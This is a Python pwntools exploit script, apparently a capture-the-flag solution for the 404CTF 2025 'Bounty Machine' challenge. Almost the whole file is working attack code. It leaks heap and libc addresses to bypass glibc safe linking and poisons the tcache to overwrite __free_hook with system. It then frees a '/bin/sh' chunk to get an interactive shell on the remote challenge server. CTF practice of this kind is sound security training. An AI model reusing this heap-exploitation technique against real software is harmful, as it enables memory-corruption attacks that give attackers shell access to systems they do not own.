#!/usr/bin/env python3

# Author: Pwnsard
# Challenge: Bounty Machine
# CTF: 404CTF 2025

from pwn import *

exe = ELF(b'data/chall')
libc = ELF(b'data/libc.so.6')
ld = ELF(b'data/ld-2.32.so')

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # gdb.attach(r)
        return r
    else:
        return remote('challenges.404ctf.fr', 32463)

def display_bounties():
    r.recvuntil(b"> ")
    r.sendline(b"1")
    return r.recvuntil(b"---------------------------------------")

def add_bounty(amount: int, name: str, description: str):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b">> ")
    r.sendline(str(amount).encode("utf-8"))
    r.recvuntil(b">> ")
    r.sendline(name)
    r.recvuntil(b">> ")
    r.sendline(description)

def edit_bounty(index: int):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b">> ")
    r.sendline(str(index).encode("utf-8"))
    return r.recvuntil(b">> ")

def apply_edit(amount: int, description: str):
    r.sendline(str(amount).encode("utf-8"))
    r.recvuntil(b">> ")
    r.sendline(description)

def free_bounty():
    r.recvuntil(b"> ")
    r.sendline(b"4")

def main():
    global r 
    r = conn()

    # Putting a libc pointer somewhere on the heap
    print("[*] Setting up a libc leak")
    add_bounty(100, b"HRTC", b"A" * 0x4b0)
    add_bounty(100, b"HRTC", b"B" * 0x4b0)
    free_bounty()
    free_bounty()

    # Leaking the heap base address (to bypass safe linking)
    print("[*] Leaking heap address")
    add_bounty(100, b"HRTC", b"C" * 0x40)
    add_bounty(100, b"HRTC", b"D" * 0x40)
    free_bounty()
    leak = edit_bounty(-255)
    amount_leak = int(leak.split(b" ")[11])
    leak_pos = u64(leak.split(b'\n')[2] +  b"\x00\x00\x00")
    heap_addr = leak_pos << 12
    print(f"heap@{hex(heap_addr)}")
    apply_edit(amount_leak, p64(leak_pos) + b"E" * 0x38)
    free_bounty()

    # Now creating a fake chunk to leak libc
    print("[*] Leaking libc")
    bounties_array_addr = heap_addr + 0x2a0
    libc_addr = heap_addr + 0x400 + 1
    print(f"bounties_array@{hex(bounties_array_addr)}")
    print(f"libc_leak@{hex(libc_addr)}")
    print(f"libc_leak@{hex(bounties_array_addr ^ leak_pos)}")
    add_bounty(100, b"HRTC", b"F" * 0x30)
    add_bounty(100, b"HRTC", b"G" * 0x30)
    free_bounty()
    free_bounty()
    leak =  edit_bounty(-256)
    amount_leak = int(leak.split(b" ")[11])
    apply_edit(amount_leak, p64((bounties_array_addr - 0x20) ^ leak_pos) + b"H" * 0x28)

    add_bounty(100, b"HRTC", b"I" * 0x30)
    add_bounty(100, b"HRTC", b"J" * 0x28 + p64(libc_addr))

    leak = display_bounties()
    libc.address = int.from_bytes(b"\x00" + leak.split(b"\n")[1].split(b" ")[1], "little") - 0x1e3c00
    print(f"libc@{hex(libc.address)}")

    # Rewriting __free_hook :
    print("[*] Overwriting __free_hook")
    add_bounty(100, b"HRTC", b"K" * 0x70)
    add_bounty(100, b"HRTC", b"L" * 0x70)
    free_bounty()
    free_bounty()
    leak =  edit_bounty(-254)
    amount_leak = int(leak.split(b" ")[11])
    print(amount_leak)
    apply_edit(amount_leak, p64((libc.symbols["__free_hook"] - 0x60) ^ leak_pos) + b"H" * 0x68)

    print(hex(libc.symbols["__free_hook"]))

    print("[*] Overwriting __free_hook")
    add_bounty(100, b"HRTC", b"M" * 0x70)
    add_bounty(100, b"HRTC", b"N" * 0x60 + p64(libc.symbols["system"]))

    # Enjoy your shell sir
    add_bounty(100, b"/bin/sh\x00", b"O" * 0x70)

    r.interactive()

if __name__ == '__main__':
    main()